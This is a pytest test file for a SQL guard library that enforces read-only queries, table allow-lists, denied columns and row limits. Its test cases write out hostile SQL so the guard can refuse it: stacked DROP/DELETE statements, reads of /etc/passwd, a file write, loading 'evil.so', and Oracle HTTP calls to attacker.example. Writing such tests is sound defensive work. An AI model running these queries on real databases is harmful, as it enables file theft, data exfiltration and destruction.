import pytest

from querygate import Policy, Refused, Rule, check

POLICY = Policy.of(["marts.*", "public.orders"], max_rows=500)


def refusal(sql: str, policy: Policy = POLICY) -> Rule:
    with pytest.raises(Refused) as caught:
        check(sql, policy)
    return caught.value.rule


@pytest.mark.parametrize(
    "sql",
    [
        "drop table marts.cases",
        "insert into marts.a select 1",
        "update marts.a set x = 1",
        "delete from marts.a",
        "create table marts.b as select 1",
        "alter table marts.a add column x int",
        "truncate table marts.a",
        "copy marts.a to 'out.csv'",
        "attach 'other.db'",
        "pragma table_info('a')",
        "set memory_limit = '1GB'",
        "vacuum",
        "grant select on marts.a to public",
        "begin",
        "with gone as (delete from marts.a returning *) select * from gone",
    ],
)
def test_anything_that_is_not_a_read_is_refused(sql: str) -> None:
    assert refusal(sql) is Rule.READ_ONLY


@pytest.mark.parametrize(
    "sql",
    [
        "select 1 from marts.a; drop table marts.a",
        "select 1 from marts.a; select 2 from marts.a",
        "select 1 from marts.a; -- harmless\n; delete from marts.a",
    ],
)
def test_only_one_statement_may_run(sql: str) -> None:
    assert refusal(sql) is Rule.SINGLE_STATEMENT


def test_a_trailing_semicolon_or_comment_is_still_one_statement() -> None:
    assert check("select id from marts.a; -- done", POLICY).tables == ("marts.a",)


def test_text_that_does_not_parse_is_refused() -> None:
    assert refusal("selec * from marts.a") is Rule.PARSE
    assert refusal("select from where") is Rule.PARSE


@pytest.mark.parametrize(
    ("sql", "rule"),
    [
        ("select * from raw.customers", Rule.TABLE),
        ("select * from public.users", Rule.TABLE),
        ("select * from marts.a join raw.b using (id)", Rule.TABLE),
        ("select * from marts.a where id in (select id from raw.b)", Rule.TABLE),
        ("with x as (select * from raw.c) select * from x", Rule.TABLE),
        ("select (select max(id) from raw.c) from marts.a", Rule.TABLE),
        ("select * from cases", Rule.QUALIFY),
        ("select * from read_csv('/etc/passwd')", Rule.SOURCE),
        ("select * from range(10)", Rule.SOURCE),
        # A quoted file path is indistinguishable from a quoted table name with no schema.
        ("select * from 'data.parquet'", Rule.QUALIFY),
    ],
)
def test_only_allowed_tables_may_be_read(sql: str, rule: Rule) -> None:
    assert refusal(sql) is rule


def test_allowed_tables_are_reported_and_ctes_are_not_tables() -> None:
    checked = check(
        "with recent as (select * from marts.cases) "
        "select * from recent join public.orders o on o.id = recent.id",
        POLICY,
    )
    assert checked.tables == ("marts.cases", "public.orders")


def test_a_cte_cannot_shadow_a_schema_qualified_table() -> None:
    assert refusal("with c as (select 1) select * from raw.c") is Rule.TABLE


@pytest.mark.parametrize(
    "sql",
    [
        "select * from other.marts.cases",
        "select * from marts.x.y",
        'select * from "raw"."secrets"',
        "select * from marts.a where exists (select 1 from information_schema.tables)",
        "select * from marts.a, lateral (select * from raw.b) b",
    ],
)
def test_catalogs_quoting_and_nesting_do_not_get_around_the_allow_list(sql: str) -> None:
    assert refusal(sql, Policy.of(["marts.*"], dialect="postgres")) is Rule.TABLE


def test_a_three_part_pattern_allows_a_table_in_a_named_catalog() -> None:
    policy = Policy.of(["analytics.marts.*"], dialect="snowflake")
    assert check("select id from analytics.marts.cases", policy).tables == (
        "analytics.marts.cases",
    )
    assert refusal("select id from marts.cases", policy) is Rule.TABLE


def test_matching_is_case_insensitive() -> None:
    assert check("SELECT ID FROM MARTS.Cases", POLICY).tables == ("marts.cases",)


@pytest.mark.parametrize(
    ("sql", "dialect"),
    [
        ("select pg_read_file('/etc/passwd') from marts.a", "postgres"),
        ("select pg_sleep(30) from marts.a", "postgres"),
        ("select * from marts.a where id = (select dblink('host=x', 'select 1'))", "postgres"),
        ("select set_config('role', 'admin', false) from marts.a", "postgres"),
        ("select load_file('/etc/passwd') from marts.a", "mysql"),
        ("select sleep(30) from marts.a", "mysql"),
        ("select getenv('HOME') from marts.a", "duckdb"),
        ("select nextval('marts.seq') from marts.a", "postgres"),
        ("select readfile('/etc/passwd') from marts.a", "sqlite"),
        ("select writefile('/tmp/x', 'data') from marts.a", "sqlite"),
        ("select load_extension('evil.so') from marts.a", "sqlite"),
        ("select * from marts.a, fsdir('/home') d", "sqlite"),
        ("select utl_http.request('http://attacker.example') from marts.a", "oracle"),
        ("select sys.utl_file.fopen('DIR', 'f.txt', 'r') from marts.a", "oracle"),
        ("select dbms_xmlgen.getxml('select 1 from dual') from marts.a", "oracle"),
        ("select httpuritype('http://attacker.example').getclob() from marts.a", "oracle"),
    ],
)
def test_functions_that_reach_outside_the_query_are_refused(sql: str, dialect: str) -> None:
    assert refusal(sql, Policy.of(["marts.*"], dialect=dialect)) is Rule.FUNCTION


def test_ordinary_package_style_calls_still_run() -> None:
    # A schema-qualified user function is not one of the blocked packages.
    oracle = Policy.of(["marts.*"], dialect="oracle")
    check("select marts.fiscal_week(order_date) from marts.a", oracle)


def test_select_into_and_locking_reads_are_refused() -> None:
    postgres = Policy.of(["marts.*"], dialect="postgres")
    assert refusal("select * into marts.copy from marts.a", postgres) is Rule.READ_ONLY
    assert refusal("select * from marts.a for update", postgres) is Rule.READ_ONLY


class TestDeniedColumns:
    policy = Policy.of(["marts.*"], deny_columns=["customers.email", "ssn"])

    @pytest.mark.parametrize(
        "sql",
        [
            "select email from marts.customers",
            "select c.email from marts.customers c",
            "select count(*) n from marts.customers where email like '%@x.com'",
            "select lower(c.EMAIL) from marts.customers as c",
            "select id from marts.customers order by email",
            "select * from marts.customers",
            "select c.* from marts.customers c join marts.orders o on o.cid = c.id",
            "select ssn from marts.staff",
        ],
    )
    def test_a_denied_column_cannot_be_read_filtered_or_sorted_on(self, sql: str) -> None:
        assert refusal(sql, self.policy) is Rule.COLUMN

    def test_other_columns_of_the_same_table_can_be_read(self) -> None:
        assert check("select id, name from marts.customers", self.policy).tables == (
            "marts.customers",
        )

    def test_a_table_qualified_entry_does_not_block_other_tables(self) -> None:
        check("select email from marts.newsletter_signups", self.policy)

    def test_a_bare_entry_blocks_star_everywhere(self) -> None:
        assert refusal("select * from marts.orders", self.policy) is Rule.COLUMN

    def test_star_is_fine_without_denied_columns(self) -> None:
        check("select * from marts.orders", POLICY)


class TestRowLimit:
    def test_a_limit_is_added_when_missing(self) -> None:
        checked = check("select id from marts.a", POLICY)
        assert checked.sql == "SELECT id FROM marts.a LIMIT 500"
        assert checked.limit_added

    def test_a_smaller_limit_is_kept(self) -> None:
        checked = check("select id from marts.a limit 10", POLICY)
        assert checked.sql.endswith("LIMIT 10") and not checked.limit_added

    def test_a_larger_limit_is_cut_down(self) -> None:
        checked = check("select id from marts.a limit 100000", POLICY)
        assert checked.sql.endswith("LIMIT 500") and checked.limit_added

    def test_a_limit_must_be_a_plain_number(self) -> None:
        assert refusal("select id from marts.a limit (select 10 from marts.a)") is Rule.LIMIT

    def test_a_set_operation_is_limited_as_a_whole(self) -> None:
        checked = check("select id from marts.a union all select id from marts.b", POLICY)
        assert checked.sql.startswith("SELECT * FROM (") and checked.sql.endswith("LIMIT 500")

    def test_the_limit_is_written_in_the_target_dialect(self) -> None:
        tsql = Policy.of(["marts.*"], dialect="tsql", max_rows=5)
        assert check("select id from marts.a", tsql).sql == "SELECT TOP 5 id FROM marts.a"


def test_a_policy_must_allow_something_and_have_a_positive_limit() -> None:
    with pytest.raises(ValueError, match="at least one"):
        Policy.of([])
    with pytest.raises(ValueError, match="positive"):
        Policy.of(["a.*"], max_rows=0)


def test_the_refusal_message_can_be_shown_to_the_model() -> None:
    with pytest.raises(Refused, match=r"table raw\.customers is not allowed"):
        check("select * from raw.customers", POLICY)
